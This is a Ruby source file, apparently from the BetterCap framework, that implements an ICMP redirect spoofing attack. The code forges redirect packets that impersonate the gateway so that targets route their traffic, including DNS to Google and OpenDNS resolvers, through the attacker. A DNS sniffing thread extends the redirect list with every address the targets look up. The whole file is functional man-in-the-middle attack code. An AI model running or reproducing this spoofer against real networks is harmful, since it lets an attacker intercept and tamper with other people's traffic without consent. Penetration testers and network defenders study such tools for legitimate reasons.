# encoding: UTF-8
=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
require 'bettercap/spoofers/base'
require 'net/dns'
require 'resolv'

module BetterCap
module Spoofers
# Class to create ICMP redirection packets.
class ICMPRedirectPacket < PacketFu::Packet
    ICMP_REDIRECT = 5
    ICMP_REDIRECT_HOST = 1

    IP_PROTO_ICMP = 1
    IP_PROTO_UDP  = 17

    include PacketFu::EthHeaderMixin
    include PacketFu::IPHeaderMixin
    include PacketFu::ICMPHeaderMixin
    include PacketFu::UDPHeaderMixin

    attr_accessor :eth_header, :ip_header, :icmp_header, :ip_encl_header

    # Create a ICMPRedirectPacket instance.
    def initialize(args={})
      @eth_header = PacketFu::EthHeader.new(args).read(args[:eth])

      @ip_header          = PacketFu::IPHeader.new(args).read(args[:ip])
      @ip_header.ip_proto = IP_PROTO_ICMP

      @icmp_header           = PacketFu::ICMPHeader.new(args).read(args[:icmp])
      @icmp_header.icmp_type = ICMP_REDIRECT
      @icmp_header.icmp_code = ICMP_REDIRECT_HOST

      @ip_encl_header          = PacketFu::IPHeader.new(args).read(args[:ip])
      @ip_encl_header.ip_proto = IP_PROTO_UDP

      @udp_dummy         = PacketFu::UDPPacket.new
      @udp_dummy.udp_src = 53
      @udp_dummy.udp_dst = 53

      @ip_header.body = @icmp_header
      @eth_header.body = @ip_header

      @headers = [@eth_header, @ip_header, @icmp_header]
      super
    end

    # Update this packet with the correct +gateway+, +target+, +local+ address
    # and +address2redirect+.
    def update!( gateway, target, local, address2redirect )
      @eth_header.eth_src = PacketFu::EthHeader.mac2str(gateway.mac)
      @ip_header.ip_saddr = gateway.ip

      @eth_header.eth_dst = PacketFu::EthHeader.mac2str(target.mac)
      @ip_header.ip_daddr = target.ip

      @udp_dummy.ip_saddr = target.ip
      @udp_dummy.ip_daddr = address2redirect
      @udp_dummy.recalc

      @icmp_header.body = local.split('.').collect(&:to_i).pack('C*') +
                          @udp_dummy.ip_header.to_s

      recalc
    end
end

# This class is responsible of performing ICMP redirect attack on the network.
class Icmp < Base
  # Initialize the BetterCap::Spoofers::Icmp object.
  def initialize
    @ctx          = Context.get
    @forwarding   = @ctx.firewall.forwarding_enabled?
    @gateway      = nil
    @local        = @ctx.ifconfig[:ip_saddr]
    @spoof_thread = nil
    @watch_thread = nil
    @running      = false
    @entries      = [ '8.8.8.8', '8.8.4.4',                # Google DNS
                      '208.67.222.222', '208.67.220.220' ] # OpenDNS

    update_gateway!
  end

  # Send ICMP redirect to the +target+, redirecting the gateway ip and
  # everything in the @entries list of addresses to us.
  def send_spoofed_packet( target )
    ( [@gateway.ip] + @entries ).each do |address|
      begin
        Logger.debug "Sending ICMP Redirect to #{target.to_s_compact} redirecting #{address} to us ..."

        pkt = ICMPRedirectPacket.new
        pkt.update!( @gateway, target, @local, address )
        @ctx.packets.push(pkt)
      rescue Exception => e
        Logger.debug "#{self.class.name} : #{e.message}"
      end
    end
  end

  # Start the ICMP redirect spoofing.
  def start
    Logger.debug "Starting ICMP redirect spoofer ..."

    stop() if @running
    @running = true

    if @ctx.options.kill
      Logger.warn "Disabling packet forwarding."
      @ctx.firewall.enable_forwarding(false) if @forwarding
    else
      @ctx.firewall.enable_forwarding(true) unless @forwarding
    end

    @ctx.firewall.enable_send_redirects(false)

    @spoof_thread = Thread.new { icmp_spoofer }
    @watch_thread = Thread.new { dns_watcher }
  end

  # Stop the ICMP redirect spoofing, reset firewall state.
  def stop
    raise 'ICMP redirect spoofer is not running' unless @running

    Logger.debug 'Stopping ICMP redirect spoofer ...'
    Logger.debug "Resetting packet forwarding to #{@forwarding} ..."
    @ctx.firewall.enable_forwarding( @forwarding )

    @running = false
    begin
      @spoof_thread.exit
    rescue; end

    begin
      @workers.map(&:exit)
    rescue; end
  end

  private

  # Return true if the +pkt+ packet comes from one of our targets.
  def is_interesting_packet?(pkt)
    return false if pkt.ip_saddr == @local
    @ctx.targets.each do |target|
      if target.ip and ( target.ip == pkt.ip_saddr or target.ip == pkt.ip_daddr )
        return true
      end
    end
    false
  end

  # DNS watcher logic.
  def dns_watcher
    Logger.debug 'DNS watcher started ...'

    sniff_packets('udp and port 53') { |pkt|
      next unless is_interesting_packet?(pkt)

      dns = Net::DNS::Packet.parse(pkt.payload) rescue nil
      next if dns.nil?

      Logger.debug dns.inspect

      if dns.header.anCount > 0
        dns.answer.each do |a|
          if a.respond_to?(:address)
            Logger.debug "[DNS] Redirecting #{a.address.to_s} ..."
            @entries << a.address.to_s unless @entries.include?(a.address.to_s)
          end
        end
      end

      if dns.header.qdCount > 0
        name = dns.question.first.qName
        if name =~ /\.$/
          name = name[0,name.size-1]
        end
        Logger.info "[#{'DNS'.green}] #{pkt.ip_saddr} is requesting '#{name}' address ..."
        Resolv.each_address(name) do |ip|
          @entries << ip unless @entries.include?(ip)
        end
      end
    }
  end

  # Main spoofer loop.
  def icmp_spoofer
    spoof_loop(3) { |target|
      unless target.ip.nil? or target.mac.nil?
        send_spoofed_packet target
      end
    }
  end
end
end
end
